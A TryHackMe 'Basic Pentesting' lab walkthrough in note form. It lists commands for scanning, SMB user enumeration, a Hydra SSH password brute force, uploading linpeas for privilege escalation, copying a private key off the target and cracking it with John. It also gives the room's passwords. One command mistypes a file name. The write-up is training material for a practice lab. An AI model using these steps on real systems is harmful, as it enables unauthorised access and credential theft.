## TryHackMe - A skill enhancement platform for cybersecurity enthusiasts

 - [ ] The Basic Pentesting Room
 - [ ] Targets:
 1.  **Enumeration**: Used tools to gather information on open ports and services.
2.  **Brute Force Attack**: Performed password guessing attacks using Hydra.
3.  **Hash Cracking**: Used John the Ripper to decode password hashes.
4.  **Service Enumeration**: Identified running services and potential vulnerabilities.


# Scan the target IP
```nmap -sV -vv ip adderess```
- From the available services look for exploits with searchsploit
- Using gobuster to find hidden directories
- ```gobuster dir http://ip/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
- SMB analysis with enum4linux (-a for all enumerations basically for users)
- ```enum4linux -a IP```
-       We get to know about two users jan and kay
- We Brute force the password with this info using ssh service and hydra
- ``` hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://ip -t 20 -V```
- hydra`: The tool itself, used for brute-force password cracking.
-   `-l kay`: Specifies the login/username to be used in the attack. In this case, `kay`.
-   `-P /usr/share/wordlists/rockyou.txt`: Specifies the password list file to use. The `rockyou.txt` file is a popular wordlist used in password cracking.
-   `ssh://ip`: Specifies the protocol and target. Replace `ip` with the actual IP address or hostname of the target SSH server.
-   `-t 20`: Sets the number of parallel connections (tasks) to 20. This means Hydra will attempt 20 password guesses simultaneously.
-   `-V`: Enables verbose mode, meaning Hydra will output detailed information about each attempt it makes.
- we got password of user jan as armando
- For enumerating the password of Kay,we need privilege escalation
- visit github.com/keralahacker/Peass-ng   ,release and top .sh file
- linpeas - a privilege escalation tool
- scp - service for secure copy
- we find that in /dev/shm we have permission to read , write and execute so we send the linpeas file to that folder with the help of scp
- ```scp linpeas.sh jan@ip.com:/dev/shm/```
- ```./linpeas.sh```
- ```ls -lha``` for permissions
- analyse the linpeas output and move to the .ssh directory as mentioned by linpeas it has a private key hardcoded
- transfer the key to kali with python server
- ``` python3 -m http.server 8085```
- ``` python3 /usr/share/john/ssh2john.py id_rsa > hash_id_rsa```
- ```john --wordlist=/usr/share/wordlists/rockyou.txt has_id_rsa```
- password - beeswax
